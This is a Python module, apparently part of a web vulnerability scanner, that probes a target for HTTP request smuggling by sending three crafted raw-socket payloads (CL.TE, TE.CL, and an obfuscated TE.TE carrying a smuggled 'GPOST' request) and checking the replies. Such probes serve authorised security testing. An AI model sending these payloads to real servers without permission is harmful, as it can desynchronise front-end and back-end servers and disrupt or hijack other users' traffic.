"""smuggling — HTTP request smuggling probe (CL.TE, TE.CL, TE.TE)"""
from core.http import HttpClient
import socket
from urllib.parse import urlparse

class Smuggling:
    def run(self, session, logger):
        u = urlparse(session.target)
        host = u.hostname
        port = u.port or (443 if u.scheme == "https" else 80)
        if u.scheme == "https":
            print("[smuggling] TLS not supported in raw socket probe, skipping")
            return {"findings": []}

        findings = []
        # CL.TE probe: Content-Length + Transfer-Encoding both, TE wins
        probes = [
            # CL.TE
            ("POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED\r\n"),
            # TE.CL
            ("POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"),
            # TE.TE obfuscated
            ("POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"),
        ]
        for i, probe in enumerate(probes):
            try:
                s = socket.create_connection((host, port), timeout=6)
                s.sendall(probe.format(h=host).encode())
                s.settimeout(4)
                resp = b""
                try:
                    while True:
                        chunk = s.recv(4096)
                        if not chunk: break
                        resp += chunk
                except socket.timeout: pass
                s.close()
                text = resp.decode(errors="ignore")
                # look for two responses or smuggled reflection
                if text.count("HTTP/1.") >= 2 or "SMUGGLED" in text and "400" in text:
                    findings.append({"type": f"probe_{i}", "evidence": text[:200]})
                    print(f"  [!] possible smuggling on probe {i}")
                    logger.finding("smuggling","high",f"probe_{i} evidence={text[:120]}")
                else:
                    print(f"  probe {i}: no evidence (code={text.split()[1] if text else 'none'})")
            except Exception as e:
                print(f"  probe {i} error: {e}")
        print(f"[smuggling] done: {len(findings)}")
        return {"findings": findings}
